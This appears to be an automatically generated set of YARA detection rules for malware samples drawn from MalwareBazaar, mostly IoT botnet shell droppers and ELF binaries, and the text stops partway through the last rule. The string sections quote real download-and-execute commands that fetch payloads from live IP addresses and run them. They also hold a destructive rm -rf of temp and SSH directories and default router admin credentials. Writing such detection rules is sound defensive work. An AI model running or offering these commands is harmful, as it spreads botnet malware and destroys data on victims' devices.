/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-04
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_043192fa8d94ade81985a4f029a80fc65ec6f4a12aab7744484f2bdbb1753ef7 {
   meta:
      description = "evidences - file 043192fa8d94ade81985a4f029a80fc65ec6f4a12aab7744484f2bdbb1753ef7.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "043192fa8d94ade81985a4f029a80fc65ec6f4a12aab7744484f2bdbb1753ef7"
   strings:
      $s1 = "rm -rf o; curl http://103.149.87.18/mpsl    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s2 = "rm -rf o; curl http://103.149.87.18/ppc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s3 = "rm -rf o; curl http://103.149.87.18/mips    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s4 = "rm -rf o; curl http://103.149.87.18/spc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s5 = "rm -rf o; curl http://103.149.87.18/arm     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s6 = "rm -rf o; curl http://103.149.87.18/arm7    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s7 = "rm -rf o; curl http://103.149.87.18/sh4     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s8 = "rm -rf o; curl http://103.149.87.18/arm6    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s9 = "rm -rf o; curl http://103.149.87.18/m68k    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s10 = "rm -rf o; curl http://103.149.87.18/arc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s11 = "rm -rf o; curl http://103.149.87.18/arm5    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s12 = "rm -rf o; curl http://103.149.87.18/i686    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_4215e9be500ed04955445c5d26b51057e40c461fc5793bb576cead27d3ea105f {
   meta:
      description = "evidences - file 4215e9be500ed04955445c5d26b51057e40c461fc5793bb576cead27d3ea105f.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4215e9be500ed04955445c5d26b51057e40c461fc5793bb576cead27d3ea105f"
   strings:
      $s1 = "rm -rf o; wget http://103.149.87.18/arc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s2 = "rm -rf o; wget http://103.149.87.18/sh4     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s3 = "rm -rf o; wget http://103.149.87.18/arm     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s4 = "rm -rf o; wget http://103.149.87.18/arm6    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s5 = "rm -rf o; wget http://103.149.87.18/mips    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s6 = "rm -rf o; wget http://103.149.87.18/mpsl    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s7 = "rm -rf o; wget http://103.149.87.18/arm7    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s8 = "rm -rf o; wget http://103.149.87.18/ppc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s9 = "rm -rf o; wget http://103.149.87.18/m68k    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s10 = "rm -rf o; wget http://103.149.87.18/spc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s11 = "rm -rf o; wget http://103.149.87.18/arm5    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s12 = "rm -rf o; wget http://103.149.87.18/i686    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_6054c49b043bc4b83d424b66f4e155d890b65ad70fd08bf4978517d79dd4a474 {
   meta:
      description = "evidences - file 6054c49b043bc4b83d424b66f4e155d890b65ad70fd08bf4978517d79dd4a474.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "6054c49b043bc4b83d424b66f4e155d890b65ad70fd08bf4978517d79dd4a474"
   strings:
      $s1 = "rm -rf o; wget http://87.121.112.16/mips    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s2 = "rm -rf o; wget http://87.121.112.16/mpsl    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s3 = "rm -rf o; wget http://87.121.112.16/ppc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s4 = "rm -rf o; wget http://87.121.112.16/arm5    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s5 = "rm -rf o; wget http://87.121.112.16/arm7    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s6 = "rm -rf o; wget http://87.121.112.16/m68k    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s7 = "rm -rf o; wget http://87.121.112.16/arm     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s8 = "rm -rf o; wget http://87.121.112.16/spc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s9 = "rm -rf o; wget http://87.121.112.16/i686    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s10 = "rm -rf o; wget http://87.121.112.16/sh4     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s11 = "rm -rf o; wget http://87.121.112.16/arc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s12 = "rm -rf o; wget http://87.121.112.16/arm6    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_66d8f2f914a0b4e3c566c9c09d09d03817093d4ed42fd49a4aef7a63a638e2f8 {
   meta:
      description = "evidences - file 66d8f2f914a0b4e3c566c9c09d09d03817093d4ed42fd49a4aef7a63a638e2f8.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "66d8f2f914a0b4e3c566c9c09d09d03817093d4ed42fd49a4aef7a63a638e2f8"
   strings:
      $s1 = "rm -rf o; curl http://87.121.112.16/i686    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s2 = "rm -rf o; curl http://87.121.112.16/arm6    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s3 = "rm -rf o; curl http://87.121.112.16/mips    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s4 = "rm -rf o; curl http://87.121.112.16/arm5    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s5 = "rm -rf o; curl http://87.121.112.16/arc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s6 = "rm -rf o; curl http://87.121.112.16/arm7    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s7 = "rm -rf o; curl http://87.121.112.16/ppc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s8 = "rm -rf o; curl http://87.121.112.16/mpsl    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s9 = "rm -rf o; curl http://87.121.112.16/m68k    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s10 = "rm -rf o; curl http://87.121.112.16/spc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s11 = "rm -rf o; curl http://87.121.112.16/arm     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s12 = "rm -rf o; curl http://87.121.112.16/sh4     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_046c06cdab4dc1f4d02c2b7619fec397e9b21af5dd18c3e5cdab806931b77d75 {
   meta:
      description = "evidences - file 046c06cdab4dc1f4d02c2b7619fec397e9b21af5dd18c3e5cdab806931b77d75.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "046c06cdab4dc1f4d02c2b7619fec397e9b21af5dd18c3e5cdab806931b77d75"
   strings:
      $s1 = "xgethostbyname" fullword ascii
      $s2 = "bb_default_login_shell" fullword ascii
      $s3 = "get_kernel_revision" fullword ascii
      $s4 = "xgetcwd" fullword ascii
      $s5 = "bb_get_last_path_component" fullword ascii
      $s6 = "bb_lookup_host" fullword ascii
      $s7 = "bb_process_escape_sequence" fullword ascii
      $s8 = "cmdedit_read_input" fullword ascii
      $s9 = "bb_xgetularg10_bnd" fullword ascii
      $s10 = "bb_xgetlarg" fullword ascii
      $s11 = "my_getgrnam" fullword ascii
      $s12 = "bb_xgetularg_bnd_sfx" fullword ascii
      $s13 = "__fgetc_unlocked" fullword ascii
      $s14 = "my_getpwuid" fullword ascii
      $s15 = "get_terminal_width_height" fullword ascii
      $s16 = "bb_xgetularg_bnd" fullword ascii
      $s17 = "tftp_main" fullword ascii
      $s18 = "bb_getopt_ulflags" fullword ascii
      $s19 = "bb_show_usage" fullword ascii
      $s20 = "usage_messages" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_66640672478590001f0d1524ea7a3ef10c7dec9848e999560aadae4479537c7b {
   meta:
      description = "evidences - file 66640672478590001f0d1524ea7a3ef10c7dec9848e999560aadae4479537c7b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "66640672478590001f0d1524ea7a3ef10c7dec9848e999560aadae4479537c7b"
   strings:
      $x1 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker" ascii
      $x2 = "\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" langua" ascii
      $x3 = "api-ms-win-downlevel-shell32-l1-1-0.dll" fullword wide /* reversed goodware string 'lld.0-1-1l-23llehs-levelnwod-niw-sm-ipa' */
      $s4 = "2345DLAgent.dll" fullword wide
      $s5 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker" ascii
      $s6 = "yuser32.dll" fullword wide
      $s7 = "2345Recommender.exe" fullword wide
      $s8 = "courgette_dll.dll" fullword wide
      $s9 = "Explorer_2345DLAgent.exe" fullword wide
      $s10 = "libegl.dll" fullword wide
      $s11 = "libglesv2.dll" fullword wide
      $s12 = "2345ExplorerRegister.dll" fullword wide
      $s13 = "libexif.dll" fullword wide
      $s14 = "breakpad.dll" fullword wide
      $s15 = "Jntdll.dll" fullword wide
      $s16 = "Jgdi32.dll" fullword wide
      $s17 = "2345Explorer.exe" fullword wide
      $s18 = "2345Explorer_important.exe" fullword wide
      $s19 = "2345ExplorerRegister.exe" fullword wide
      $s20 = "AppPolicyGetProcessTerminationMethod" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule sig_6ef5eb1aa43924d6ba67ef4133c140af11562daf17119c2b905b096e8dbee306 {
   meta:
      description = "evidences - file 6ef5eb1aa43924d6ba67ef4133c140af11562daf17119c2b905b096e8dbee306.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "6ef5eb1aa43924d6ba67ef4133c140af11562daf17119c2b905b096e8dbee306"
   strings:
      $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "/bin/busybox wget http://" fullword ascii
      $s6 = "/home/process" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s9 = "linuxshell" fullword ascii
      $s10 = "/usr/libexec/" fullword ascii
      $s11 = "/bin/busybox hostname FICORA" fullword ascii
      $s12 = "/curl.sh -o- | sh" fullword ascii
      $s13 = "/bin/busybox echo -ne " fullword ascii
      $s14 = "solokey" fullword ascii
      $s15 = "supportadmin" fullword ascii
      $s16 = "telecomadmin" fullword ascii
      $s17 = "admintelecom" fullword ascii
      $s18 = "GET /dlr." fullword ascii
      $s19 = "Remote I/O error" fullword ascii
      $s20 = "/system/system/bin/" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_1c60ae283668b07e0eb396fe8e32ae94ea4f2d84ded8997bf431392faa0e52a3 {
   meta:
      description = "evidences - file 1c60ae283668b07e0eb396fe8e32ae94ea4f2d84ded8997bf431392faa0e52a3.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "1c60ae283668b07e0eb396fe8e32ae94ea4f2d84ded8997bf431392faa0e52a3"
   strings:
      $s1 = "(wget http://185.157.247.12/ss/armv4l -O- || busybox wget http://185.157.247.12/ss/armv4l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s2 = "(wget http://185.157.247.12/ss/armv4l -O- || busybox wget http://185.157.247.12/ss/armv4l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s3 = "(wget http://185.157.247.12/ss/armv7l -O- || busybox wget http://185.157.247.12/ss/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s4 = "(wget http://185.157.247.12/ss/armv7l -O- || busybox wget http://185.157.247.12/ss/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s5 = "rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/sh" ascii
      $s6 = "rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/sh" ascii
      $s7 = "m/.* /var/tmp/* /var/tmp/.* ~/.ssh/*;" fullword ascii
      $s8 = " .f; # ; rm -rf .f;" fullword ascii
      $s9 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      all of them
}

rule sig_272e6696a73e9c7d76b54196611ea97aed60298924cd145695e83e9f8348cba0 {
   meta:
      description = "evidences - file 272e6696a73e9c7d76b54196611ea97aed60298924cd145695e83e9f8348cba0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "272e6696a73e9c7d76b54196611ea97aed60298924cd145695e83e9f8348cba0"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s2 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s3 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s4 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s5 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s6 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s7 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s8 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f router; > .f" ascii
      $s9 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s10 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f router; > .f" ascii
      $s11 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s12 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s13 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s14 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s15 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s16 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s17 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s18 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s19 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s20 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f router; > " ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_2e5e6b1c4307807a36007e9f8df77fa4948a60f8533ead168e09ec5b241fff4c {
   meta:
      description = "evidences - file 2e5e6b1c4307807a36007e9f8df77fa4948a60f8533ead168e09ec5b241fff4c.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "2e5e6b1c4307807a36007e9f8df77fa4948a60f8533ead168e09ec5b241fff4c"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s2 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s3 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s4 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s5 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f bigfish; > ." ascii
      $s6 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s7 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f bigfish; > ." ascii
      $s8 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s9 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s10 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s11 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s12 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s13 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s14 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s15 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s16 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s17 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s18 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s19 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s20 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_7ffe4d701312bc48994f01ce6e560242004918e445b87e672469691ee54939c1 {
   meta:
      description = "evidences - file 7ffe4d701312bc48994f01ce6e560242004918e445b87e672469691ee54939c1.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "7ffe4d701312bc48994f01ce6e560242004918e445b87e672469691ee54939c1"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s2 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s3 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s4 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s5 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s6 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s7 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s8 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s9 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s10 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s11 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s12 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s13 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s14 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s15 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s16 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s17 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s18 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s19 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s20 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_8c87d43a225f2b04a013fbabb5e7ecdae3023cfe6a8b8bfcfc4c329be94dce10 {
   meta:
      description = "evidences - file 8c87d43a225f2b04a013fbabb5e7ecdae3023cfe6a8b8bfcfc4c329be94dce10.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "8c87d43a225f2b04a013fbabb5e7ecdae3023cfe6a8b8bfcfc4c329be94dce10"
   strings:
      $s1 = "(wget http://185.157.247.12/ee/mipsel -O- || busybox wget http://185.157.247.12/ee/mipsel -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s2 = "(wget http://185.157.247.12/ee/armv5l -O- || busybox wget http://185.157.247.12/ee/armv5l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s3 = "(wget http://185.157.247.12/ee/armv4eb -O- || busybox wget http://185.157.247.12/ee/armv4eb -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s4 = "(wget http://185.157.247.12/ee/armv4eb -O- || busybox wget http://185.157.247.12/ee/armv4eb -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s5 = "(wget http://185.157.247.12/ee/armv4l -O- || busybox wget http://185.157.247.12/ee/armv4l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s6 = "(wget http://185.157.247.12/ee/armv5l -O- || busybox wget http://185.157.247.12/ee/armv5l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s7 = "(wget http://185.157.247.12/ee/powerpc -O- || busybox wget http://185.157.247.12/ee/powerpc -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s8 = "(wget http://185.157.247.12/ee/armv6l -O- || busybox wget http://185.157.247.12/ee/armv6l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s9 = "(wget http://185.157.247.12/ee/sparc -O- || busybox wget http://185.157.247.12/ee/sparc -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s10 = "(wget http://185.157.247.12/ee/armv7l -O- || busybox wget http://185.157.247.12/ee/armv7l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s11 = "(wget http://185.157.247.12/ee/sparc -O- || busybox wget http://185.157.247.12/ee/sparc -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s12 = "(wget http://185.157.247.12/ee/sh4 -O- || busybox wget http://185.157.247.12/ee/sh4 -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s13 = "(wget http://185.157.247.12/ee/sh4 -O- || busybox wget http://185.157.247.12/ee/sh4 -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s14 = "(wget http://185.157.247.12/ee/armv6l -O- || busybox wget http://185.157.247.12/ee/armv6l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s15 = "(wget http://185.157.247.12/ee/arc -O- || busybox wget http://185.157.247.12/ee/arc -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s16 = "(wget http://185.157.247.12/ee/powerpc -O- || busybox wget http://185.157.247.12/ee/powerpc -O-) > .f; chmod 777 .f; ./.f escan;" ascii
